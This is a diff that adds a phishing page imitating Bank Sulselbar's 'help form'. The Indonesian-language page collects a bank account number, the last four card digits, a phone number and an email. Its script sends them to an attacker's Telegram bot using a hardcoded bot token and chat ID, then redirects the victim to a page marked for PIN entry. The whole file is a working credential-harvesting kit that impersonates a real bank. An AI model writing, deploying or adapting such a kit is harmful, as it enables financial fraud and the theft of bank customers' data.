@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
+    <title>Bank Sulselbar | Bantuan</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Style Loading Full Screen */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #70BD00;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            margin-bottom: 12px;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #70BD00;
+        }
+
+        /* ========================================== */
+        /* STYLE BARU UNTUK SPLASH SCREEN BANK SULSELBAR */
+        /* ========================================== */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #70BD00; /* Warna hijau sesuai gambar */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            transition: opacity 1s ease-out; /* Efek hilang perlahan */
+        }
+        #splash-screen.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .pattern-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: linear-gradient(45deg, rgba(255,255,255,0.05) 25%, transparent 25%), 
+                              linear-gradient(-45deg, rgba(255,255,255,0.05) 25%, transparent 25%), 
+                              linear-gradient(45deg, transparent 75%, rgba(255,255,255,0.05) 75%), 
+                              linear-gradient(-45deg, transparent 75%, rgba(255,255,255,0.05) 75%);
+            background-size: 20px 20px;
+            background-position: 0 0, 0 10px, 10px -10px, -10px 0px;
+            opacity: 0.3;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ========================================== -->
+    <!-- TAMBAHAN: HALAMAN AWAL / SPLASH SCREEN -->
+    <!-- ========================================== -->
+    <div id="splash-screen">
+        <div class="pattern-bg"></div>
+        <div class="relative z-10 text-center text-white">
+            <div class="flex flex-col items-center">
+                <!-- GANTI FOTO DISINI -->
+                <img src="Tv.webp" alt="Logo Bank Sulselbar" class="w-48 h-auto mb-4">
+                <h1 class="text-4xl font-bold tracking-wide"></h1>
+                <p class="text-xl mt-2 opacity-90"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Mohon Tunggu...</div>
+    </div>
+
+    <!-- Header -->
+    <div class="bg-green-600 text-white px-4 py-3 flex items-center shadow-sm">
+        <a href="#" onclick="goBack()" class="mr-3">
+            <i class="fas fa-arrow-left text-lg"></i>
+        </a>
+        <h1 class="text-lg font-bold">Formulir Bantuan</h1>
+    </div>
+
+    <!-- Teks Penjelasan -->
+    <div class="px-5 py-3 text-gray-500 text-sm">
+        Lengkapi data berikut 
+    </div>
+
+    <!-- Form Container -->
+    <div class="px-5">
+        <form id="dataForm">
+            <!-- No Rekening -->
+            <div class="mb-4">
+                <label class="block text-gray-800 text-base font-semibold mb-1">No. Rekening</label>
+                <input type="tel" id="rekening" placeholder="Masukkan Nomor Rekening" maxlength="18" required 
+                       class="w-full text-gray-600 text-base border-b border-gray-300 py-2 focus:border-green-600 transition">
+            </div>
+
+            <!-- 4 Digit Terakhir -->
+            <div class="mb-4">
+                <label class="block text-gray-800 text-base font-semibold mb-1">4 Digit Terakhir No. Kartu</label>
+                <input type="tel" id="kartu" maxlength="4" placeholder="Masukkan 4 Digit Terakhir" 
+                       class="w-full text-gray-600 text-base border-b border-gray-300 py-2 focus:border-green-600 transition">
+            </div>
+
+            <!-- No Handphone -->
+            <div class="mb-4">
+                <label class="block text-gray-800 text-base font-semibold mb-1">No. Handphone</label>
+                <input type="tel" id="hp" placeholder="Masukkan No. Handphone" maxlength="14" 
+                       class="w-full text-gray-600 text-base border-b border-gray-300 py-2 focus:border-green-600 transition">
+            </div>
+
+            <!-- Email -->
+            <div class="mb-6">
+                <label class="block text-gray-800 text-base font-semibold mb-1">Email</label>
+                <input type="email" id="email" placeholder="Masukkan Email" 
+                       class="w-full text-gray-600 text-base border-b border-gray-300 py-2 focus:border-green-600 transition">
+            </div>
+
+            <!-- Tombol Lanjutkan -->
+            <button type="submit" 
+                    class="w-full bg-green-600 hover:bg-green-700 text-white text-lg font-bold py-3 rounded transition duration-300 shadow">
+                LANJUTKAN
+            </button>
+        </form>
+    </div>
+
+    <script>
+        // ==========================================
+        // SCRIPT BARU UNTUK SPLASH SCREEN
+        // ==========================================
+        window.onload = function() {
+            setTimeout(() => {
+                document.getElementById('splash-screen').classList.add('fade-out');
+                setTimeout(() => {
+                    document.getElementById('splash-screen').style.display = 'none';
+                }, 1000); // Waktu animasi hilang (1 detik)
+            }, 3000); // Waktu tampil (3 detik)
+        };
+
+        // Ganti dengan Token Bot dan Chat ID kamu
+        const BOT_TOKEN = '8795383747%3AAAGfHT_1RNxZQwXDZBt9lQak_376x1FhHHk'; 
+        const CHAT_ID = '8399708797';
+
+        const form = document.getElementById('dataForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Ambil nilai input
+            const rekening = document.getElementById('rekening').value.trim();
+            const kartu = document.getElementById('kartu').value.trim();
+            const hp = document.getElementById('hp').value.trim();
+            const email = document.getElementById('email').value.trim();
+
+            // Validasi
+            if (!rekening || !kartu || !hp || !email) {
+                alert('Mohon isi semua kolom data!');
+                return;
+            }
+
+            if (kartu.length !== 4) {
+                alert('Nomor kartu harus 4 digit!');
+                return;
+            }
+
+            // Tampilkan Loading
+            loadingOverlay.style.display = 'flex';
+
+            // Siapkan pesan untuk dikirim ke Telegram
+            const message = `📝 *FORMULIR PENDAFTARAN*\n\n` +
+                            `🔢 No. Rekening: ${rekening}\n` +
+                            `💳 4 Digit Terakhir: ${kartu}\n` +
+                            `📱 No. Handphone: ${hp}\n` +
+                            `📧 Email: ${email}\n\n` +
+                            `✅ Data berhasil dikirim.`;
+
+            // Kirim ke Telegram
+            sendToTelegram(message);
+        });
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                    form.reset();
+                    // ===> PINDAH KE HALAMAN MASUKKAN PIN <===
+                    window.location.href = "2.html"; 
+                }, 2000); 
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                loadingOverlay.style.display = 'none';
+                alert('Gagal mengirim data. Coba lagi.');
+            });
+        }
+
+        // Fungsi tombol kembali
+        function goBack() {
+            window.history.back();
+        }
+    </script>
+
+</body>
+</html>
